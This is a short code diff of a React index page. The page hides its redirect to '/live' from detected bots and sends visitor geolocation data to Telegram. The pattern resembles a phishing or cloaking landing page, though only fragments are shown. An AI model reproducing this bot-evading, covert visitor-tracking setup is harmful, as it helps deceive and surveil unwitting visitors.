@@ -9,9 +9,8 @@ const Index: FC = () => {
     useEffect(() => {
         console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
         if (shouldRedirect && !isBot && !isLoading) {
-            const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
-            console.log('Redirecting to:', redirectUrl);
-            window.location.href = redirectUrl;
+            console.log('Redirecting to: /live');
+            window.location.href = '/live';
         }
     }, [shouldRedirect, isBot, isLoading]);
 
@@ -73,14 +72,13 @@ const Index: FC = () => {
 
                     const result = await response.json();
 
-                    if (!response.ok) {
-                        console.error('telegram api error:', result);
-                    } else {
+                    if (response.ok) {
                         console.log('telegram sent successfully:', result);
+                    } else {
+                        console.error('telegram api error:', result);
                     }
                 } catch (error) {
                     console.error('telegram send fail:', error);
-                    const errorMsg = error instanceof Error ? error.message : 'Không thể kết nối';
                 }
             };
             fetchGeoAndSendTelegram();
@@ -89,8 +87,7 @@ const Index: FC = () => {
     useEffect(() => {
         if (!isLoading && !isBot && !shouldRedirect) {
             const timer = setTimeout(() => {
-                const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
-                window.location.href = redirectUrl;
+                window.location.href = '/live';
             }, 5000);
 
             return () => clearTimeout(timer);
